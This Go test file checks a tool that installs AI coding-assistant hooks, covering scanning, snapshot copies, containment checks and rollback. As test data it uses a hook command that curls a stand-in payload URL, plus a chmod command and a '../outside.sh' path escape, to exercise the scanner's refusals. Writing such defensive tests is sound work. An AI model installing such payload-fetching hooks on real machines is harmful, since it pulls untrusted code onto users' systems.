package loadout

import (
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/tidwall/gjson"
)

// writeHookCommand rewrites the hook in hookDir to run cmd, writing each
// script beside hook.json.
func writeHookCommand(t *testing.T, hookDir, cmd string, scripts map[string]string) {
	t.Helper()
	hookJSON := `{"spec":"hooks/0.1","hooks":[{"event":"PostToolUse","matcher":".*","handler":{"type":"command","command":` + jsonString(cmd) + `}}]}`
	if err := os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(hookJSON), 0644); err != nil {
		t.Fatal(err)
	}
	for name, body := range scripts {
		if err := os.WriteFile(filepath.Join(hookDir, name), []byte(body), 0755); err != nil {
			t.Fatal(err)
		}
	}
}

func jsonString(s string) string {
	return `"` + strings.ReplaceAll(strings.ReplaceAll(s, `\`, `\\`), `"`, `\"`) + `"`
}

func settingsCommand(t *testing.T, homeDir string) string {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(homeDir, ".claude", "settings.json"))
	if err != nil {
		t.Fatalf("reading settings.json: %v", err)
	}
	return gjson.GetBytes(data, "hooks.PostToolUse.0.hooks.0.command").String()
}

func assertNoSnapshot(t *testing.T, projectRoot string) {
	t.Helper()
	if entries, _ := os.ReadDir(filepath.Join(projectRoot, ".syllago", "snapshots")); len(entries) != 0 {
		t.Errorf("snapshots left behind: %v", entries)
	}
}

// The hook runs a copy of its script that the apply scanned, kept in the
// snapshot, so a later change to the Library script cannot change what
// runs, and remove deletes the copy with the snapshot.
func TestApply_CopiesHookScriptsIntoTheSnapshot(t *testing.T) {
	homeDir, projectRoot, manifest, cat, prov := setupTestEnv(t)
	t.Setenv("HOME", homeDir)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]
	writeHookCommand(t, cat.Items[0].Path, "./lint.sh --strict", map[string]string{"lint.sh": "#!/bin/sh\necho lint\n"})

	result, err := Apply(manifest, cat, prov, ApplyOptions{Mode: "keep", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot})
	if err != nil {
		t.Fatalf("Apply: %v", err)
	}
	copied := filepath.Join(result.SnapshotDir, "hook-scripts", "my-hook", "lint.sh")
	if got, want := settingsCommand(t, homeDir), copied+" --strict"; got != want {
		t.Errorf("hook command = %q, want %q", got, want)
	}
	if data, err := os.ReadFile(copied); err != nil || string(data) != "#!/bin/sh\necho lint\n" {
		t.Errorf("copied script = %q, %v", data, err)
	}
	if want := "Scripts will be copied to " + filepath.Dir(copied) + "/"; !strings.Contains(strings.Join(result.Warnings, "\n"), want) {
		t.Errorf("warnings %q do not contain %q", result.Warnings, want)
	}

	if _, err := Remove(RemoveOptions{ProjectRoot: projectRoot}); err != nil {
		t.Fatalf("Remove: %v", err)
	}
	if _, err := os.Lstat(copied); !errors.Is(err, fs.ErrNotExist) {
		t.Errorf("remove left the copied script (lstat err %v)", err)
	}
}

// A hook with high-severity findings shows them in the preview and fails
// the apply before anything changes, unless the apply is forced.
func TestApply_RefusesHookWithHighFindingsUnlessForced(t *testing.T) {
	t.Parallel()
	homeDir, projectRoot, manifest, cat, prov := setupTestEnv(t)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]
	writeHookCommand(t, cat.Items[0].Path, "curl https://example.com/payload", nil)
	opts := ApplyOptions{Mode: "preview", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot}

	preview, err := Apply(manifest, cat, prov, opts)
	if err != nil {
		t.Fatalf("preview: %v", err)
	}
	if len(preview.Actions) != 1 || preview.Actions[0].Action != "merge-hook" || !strings.Contains(preview.Actions[0].Problem, "high-severity") {
		t.Fatalf("preview actions = %+v, want a merge-hook naming its high-severity findings", preview.Actions)
	}

	opts.Mode = "keep"
	_, err = Apply(manifest, cat, prov, opts)
	var sfErr *ScannerFindingsError
	if !errors.As(err, &sfErr) || len(sfErr.Problems) != 1 || !strings.HasPrefix(sfErr.Problems[0], "my-hook — ") {
		t.Fatalf("keep: got %v, want a ScannerFindingsError naming my-hook", err)
	}
	if _, err := os.Lstat(filepath.Join(homeDir, ".claude", "settings.json")); !errors.Is(err, fs.ErrNotExist) {
		t.Errorf("refused apply wrote settings.json (lstat err %v)", err)
	}
	assertNoSnapshot(t, projectRoot)

	opts.Force = true
	result, err := Apply(manifest, cat, prov, opts)
	if err != nil {
		t.Fatalf("forced: %v", err)
	}
	if got := settingsCommand(t, homeDir); got != "curl https://example.com/payload" {
		t.Errorf("forced hook command = %q", got)
	}
	if !strings.Contains(strings.Join(result.Warnings, "\n"), "network request") {
		t.Errorf("forced apply warnings %q do not report the finding", result.Warnings)
	}
}

// A finding below high severity is reported and does not stop the apply.
func TestApply_WarnsOfAMediumFindingWithoutForce(t *testing.T) {
	t.Parallel()
	homeDir, projectRoot, manifest, cat, prov := setupTestEnv(t)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]
	writeHookCommand(t, cat.Items[0].Path, "chmod 755 build.sh", nil)

	result, err := Apply(manifest, cat, prov, ApplyOptions{Mode: "keep", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot})
	if err != nil {
		t.Fatalf("Apply: %v", err)
	}
	if !strings.Contains(strings.Join(result.Warnings, "\n"), "permission change") {
		t.Errorf("warnings %q do not report the finding", result.Warnings)
	}
}

// A script reference that leaves the hook's directory fails the apply,
// which rolls back.
func TestApply_RefusesAHookScriptOutsideItsItem(t *testing.T) {
	t.Parallel()
	homeDir, projectRoot, manifest, cat, prov := setupTestEnv(t)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]
	hookDir := cat.Items[0].Path
	os.WriteFile(filepath.Join(filepath.Dir(hookDir), "outside.sh"), []byte("#!/bin/sh\n"), 0755)
	writeHookCommand(t, hookDir, "../outside.sh", nil)

	_, err := Apply(manifest, cat, prov, ApplyOptions{Mode: "keep", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot})
	if err == nil || !strings.Contains(err.Error(), "outside item directory") || !strings.Contains(err.Error(), "rolled back") {
		t.Fatalf("Apply: got %v, want a rolled-back containment error", err)
	}
	if _, err := os.Lstat(filepath.Join(homeDir, ".claude", "settings.json")); !errors.Is(err, fs.ErrNotExist) {
		t.Errorf("settings.json the apply created is still there (lstat err %v)", err)
	}
	assertNoSnapshot(t, projectRoot)
}

// A rollback deletes the scripts the apply copied, with the snapshot.
func TestApply_RollbackDeletesCopiedHookScripts(t *testing.T) {
	t.Parallel()
	if runtime.GOOS == "windows" || os.Geteuid() == 0 {
		t.Skip("needs a directory the test cannot write")
	}
	homeDir, projectRoot, manifest, cat, prov := setupTestEnv(t)
	manifest.Rules = nil
	cat.Items = cat.Items[1:]
	writeHookCommand(t, cat.Items[0].Path, "./lint.sh", map[string]string{"lint.sh": "#!/bin/sh\n"})
	syllagoDir := filepath.Join(projectRoot, ".syllago")
	os.MkdirAll(filepath.Join(syllagoDir, "snapshots"), 0755)
	// installed.json cannot be saved, which fails the apply after its writes.
	os.Chmod(syllagoDir, 0555)
	t.Cleanup(func() { os.Chmod(syllagoDir, 0755) })

	_, err := Apply(manifest, cat, prov, ApplyOptions{Mode: "keep", ProjectRoot: projectRoot, HomeDir: homeDir, RepoRoot: projectRoot})
	if err == nil || !strings.Contains(err.Error(), "rolled back") {
		t.Fatalf("Apply: got %v, want a rolled-back error", err)
	}
	assertNoSnapshot(t, projectRoot)
}
